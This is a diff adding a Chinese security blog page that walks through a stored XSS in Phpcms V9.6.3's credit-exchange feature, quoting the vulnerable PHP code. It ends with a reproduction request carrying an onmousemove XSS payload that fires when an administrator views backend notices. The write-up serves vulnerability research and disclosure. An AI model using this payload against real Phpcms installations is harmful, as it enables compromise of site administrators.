@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpcms V9.6.3 储存型xss一、漏洞简介二、漏洞影响Phpcms V9.6.3 三、复现过程漏洞分析问题出在会员的积分兑换功能，文件： &#x2F;phpcms&#x2F;modules&#x2F;member&#x2F;index.php  public function change_credit() &amp;#123;   $memberinfo &#x3D; $this-&gt;memberinfo;   &#x2F;&#x2F;加载用户模块配置">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpcms V9.6.3 储存型xss一、漏洞简介二、漏洞影响Phpcms V9.6.3 三、复现过程漏洞分析问题出在会员的积分兑换功能，文件： &#x2F;phpcms&#x2F;modules&#x2F;member&#x2F;index.php  public function change_credit() &amp;#123;   $memberinfo &#x3D; $this-&gt;memberinfo;   &#x2F;&#x2F;加载用户模块配置">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/PhpcmsV9.6.3%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:26:01.739Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/PhpcmsV9.6.3%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpcms/Phpcms V9.6.3 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.739Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-6-3-储存型xss"><a href="#Phpcms-V9-6-3-储存型xss" class="headerlink" title="Phpcms V9.6.3 储存型xss"></a>Phpcms V9.6.3 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>问题出在会员的积分兑换功能，文件：</p>
+<pre><code>/phpcms/modules/member/index.php
+ public function change_credit() &#123;
+  $memberinfo = $this-&gt;memberinfo;
+  //加载用户模块配置
+  $member_setting = getcache(&#39;member_setting&#39;);
+  $this-&gt;_init_phpsso();
+  $setting = $this-&gt;client-&gt;ps_getcreditlist();
+  $outcredit = unserialize($setting);
+  $setting = $this-&gt;client-&gt;ps_getapplist();
+  $applist = unserialize($setting);
+
+  if(isset($_POST[&#39;dosubmit&#39;])) &#123;
+   //本系统积分兑换数
+   $fromvalue = intval($_POST[&#39;fromvalue&#39;]);
+   //本系统积分类型
+   $from = $_POST[&#39;from&#39;];
+   $toappid_to = explode(&#39;_&#39;, $_POST[&#39;to&#39;]);      //这个是问题的参数
+   //目标系统appid
+   $toappid = $toappid_to[0];
+   //目标系统积分类型
+   $to = $toappid_to[1];
+   if($from == 1) &#123;
+    if($memberinfo[&#39;point&#39;] &lt; $fromvalue) &#123;
+     showmessage(L(&#39;need_more_point&#39;), HTTP_REFERER);
+    &#125;
+   &#125; elseif($from == 2) &#123;
+    if($memberinfo[&#39;amount&#39;] &lt; $fromvalue) &#123;
+     showmessage(L(&#39;need_more_amount&#39;), HTTP_REFERER);
+    &#125;
+   &#125; else &#123;
+    showmessage(L(&#39;credit_setting_error&#39;), HTTP_REFERER);
+   &#125;
+
+   $status = $this-&gt;client-&gt;ps_changecredit($memberinfo[&#39;phpssouid&#39;], $from, $toappid, $to, $fromvalue);
+</code></pre>
+<p>这里有个问题，由于<code>if($memberinfo[&#39;point&#39;] &lt; $fromvalue)</code>所以，<code>$fromvalue</code>不能大于会员的点数，但是没充值的状态下，点数是为0的，但是又由于上面有<code>intval($fromvalue)</code>，所以我们可以<code>$fromvalue=0.9</code>经过<code>intval</code>后就成了<code>0</code>，也就绕过了上面的逻辑。跟进<code>ps_changecredit</code>函数：</p>
+<pre><code>public function ps_changecredit($uid, $from, $toappid, $to, $credit) &#123;
+  return $this-&gt;_ps_send(&#39;changecredit&#39;, array(&#39;uid&#39;=&gt;$uid, &#39;from&#39;=&gt;$from, &#39;toappid&#39;=&gt;$toappid, &#39;to&#39;=&gt;$to, &#39;credit&#39;=&gt;$credit));
+ &#125;
+</code></pre>
+<p>继续跟进<code>_ps_send</code>函数：</p>
+<pre><code>private function _ps_send($action, $data = null) &#123;
+   return $this-&gt;_ps_post($this-&gt;ps_api_url.&quot;/index.php?m=phpsso&amp;c=index&amp;a=&quot;.$action, 500000, $this-&gt;auth_data($data));
+ &#125;
+</code></pre>
+<p>最后是经过<code>auth_data</code>函数处理和加密，<code>auth_data</code>调用<code>sys_auth</code>加密函数进行加密:</p>
+<pre><code>public function auth_data($data) &#123;
+  $s = $sep = &#39;&#39;;
+  foreach($data as $k =&gt; $v) &#123;
+   if(is_array($v)) &#123;
+    $s2 = $sep2 = &#39;&#39;;
+    foreach($v as $k2 =&gt; $v2) &#123;
+      $s2 .= &quot;$sep2&#123;$k&#125;[$k2]=&quot;.$this-&gt;_ps_stripslashes($v2);
+     $sep2 = &#39;&amp;&#39;;
+    &#125;
+    $s .= $sep.$s2;
+   &#125; else &#123;
+    $s .= &quot;$sep$k=&quot;.$this-&gt;_ps_stripslashes($v);
+   &#125;
+   $sep = &#39;&amp;&#39;;
+  &#125;
+
+  $auth_s = &#39;v=&#39;.$this-&gt;ps_vsersion.&#39;&amp;appid=&#39;.APPID.&#39;&amp;data=&#39;.urlencode($this-&gt;sys_auth($s));
+  return $auth_s;
+ &#125;
+</code></pre>
+<p><code>_ps_post</code>函数主要就是让服务器访问自己的网站上的一个地址也就是访问了<code>phpsso</code>的<code>changecredit</code>函数（方法）。我们先来看看<code>phpsso</code>：</p>
+<pre><code>class phpsso &#123;
+
+ public $db, $settings, $applist, $appid, $data;
+ /**
+  * 构造函数
+  */
+ public function __construct() &#123;
+  $this-&gt;db = pc_base::load_model(&#39;member_model&#39;);
+  pc_base::load_app_func(&#39;global&#39;);
+
+  /*获取系统配置*/
+  $this-&gt;settings = getcache(&#39;settings&#39;, &#39;admin&#39;);
+  $this-&gt;applist = getcache(&#39;applist&#39;, &#39;admin&#39;);
+
+  if(isset($_GET) &amp;&amp; is_array($_GET) &amp;&amp; count($_GET) &gt; 0) &#123;
+   foreach($_GET as $k=&gt;$v) &#123;
+    if(!in_array($k, array(&#39;m&#39;,&#39;c&#39;,&#39;a&#39;))) &#123;
+     $_POST[$k] = $v;
+    &#125;
+   &#125;
+  &#125;
+
+  if(isset($_POST[&#39;appid&#39;])) &#123;
+   $this-&gt;appid = intval($_POST[&#39;appid&#39;]);
+  &#125; else &#123;
+   exit(&#39;0&#39;);
+  &#125;
+
+  if(isset($_POST[&#39;data&#39;])) &#123;
+   parse_str(sys_auth($_POST[&#39;data&#39;], &#39;DECODE&#39;, $this-&gt;applist[$this-&gt;appid][&#39;authkey&#39;]), $this-&gt;data);
+
+
+parse_str(sys_auth($_POST[&#39;data&#39;], &#39;DECODE&#39;, $this-&gt;applist[$this-&gt;appid][&#39;authkey&#39;]), $this-&gt;data);可以看到是通过sys_auth函数解密（加密跟解密的函数是一样的）。
+最后来看看changecredit：
+ public function changecredit() &#123;
+  $this-&gt;uid = isset($this-&gt;data[&#39;uid&#39;]) ? $this-&gt;data[&#39;uid&#39;] : exit(&#39;0&#39;);
+  $this-&gt;toappid = isset($this-&gt;data[&#39;toappid&#39;]) ? $this-&gt;data[&#39;toappid&#39;] : exit(&#39;0&#39;);
+  $this-&gt;from = isset($this-&gt;data[&#39;from&#39;]) ? $this-&gt;data[&#39;from&#39;] : exit(&#39;0&#39;);
+  $this-&gt;to = isset($this-&gt;data[&#39;to&#39;]) ? $this-&gt;data[&#39;to&#39;] : exit(&#39;0&#39;);
+  $this-&gt;credit = isset($this-&gt;data[&#39;credit&#39;]) ? $this-&gt;data[&#39;credit&#39;] : exit(&#39;0&#39;);
+  $this-&gt;appname = $this-&gt;applist[$this-&gt;appid][&#39;name&#39;];
+  $outcredit = $this-&gt;getcredit(1);
+  //目标系统积分增加数
+  $this-&gt;credit = floor($this-&gt;credit * $outcredit[$this-&gt;from.&#39;_&#39;.$this-&gt;to][&#39;torate&#39;] / $outcredit[$this-&gt;from.&#39;_&#39;.$this-&gt;to][&#39;fromrate&#39;]);
+
+  /*插入消息队列*/
+  $noticedata[&#39;appname&#39;] = $this-&gt;appname;
+  $noticedata[&#39;uid&#39;] = $this-&gt;uid;
+  $noticedata[&#39;toappid&#39;] = $this-&gt;toappid;
+  $noticedata[&#39;totypeid&#39;] = $this-&gt;to;
+  $noticedata[&#39;credit&#39;] = $this-&gt;credit;
+  messagequeue::add(&#39;change_credit&#39;, $noticedata);
+  exit(&#39;1&#39;);
+ &#125;
+
+
+这里是进入数据库了：messagequeue::add(&#39;change_credit&#39;, $noticedata);
+ public static function add($operation, $noticedata_send) &#123;
+  $db = self::get_db();
+  $noticedata_send[&#39;action&#39;] = $operation;
+  $noticedata_send_string = array2string($noticedata_send);
+
+  if ($noticeid = $db-&gt;insert(array(&#39;operation&#39;=&gt;$operation, &#39;noticedata&#39;=&gt;$noticedata_send_string, &#39;dateline&#39;=&gt;SYS_TIME), 1)) &#123;
+   self::notice($operation, $noticedata_send, $noticeid);
+   return 1;
+  &#125; else &#123;
+   return 0;
+  &#125;
+ &#125;
+</code></pre>
+<p>调用insert写入数据。。这里就不跟了。由于系统开启了gpc（两次，初始化一次，phpsso一次），所以进去的数据是经过两次gpc的输出跟模板就不说了，反正没过滤直接出来</p>
+<p>整理一下思路，先从积分兑换填写表单，然后将数据整理成数组经过<code>sys_auth</code>加密一次，然后服务器发送数据包给自己，收到数据包之后用<code>sys_auth</code>函数解密，然后调用<code>changecredit</code>方法，<code>inert</code>插入数据库，然后管理员在后台点击通信信息的时候触发xss!</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用方法，先注册一个帐号，然后登录，然后访问:<a target="_blank" rel="noopener" href="http://www.0-sec.org/index.php?m=member&amp;c=index&amp;a=change%5C_credit&amp;post">http://www.0-sec.org/index.php?m=member&amp;c=index&amp;a=change\_credit&amp;post</a>:</p>
+<pre><code>dosubmit=1&amp;fromvalue=0.6&amp;from=1id=1`setset&#39;&amp;to=&#125;&quot; onmousemove=alert(1)&gt;//
+</code></pre>
+<p><img src="/resource/PhpcmsV9.6.3%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId26.png" alt="1.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1860">https://xz.aliyun.com/t/1860</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qu5u00e5y8v12f0gbggy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
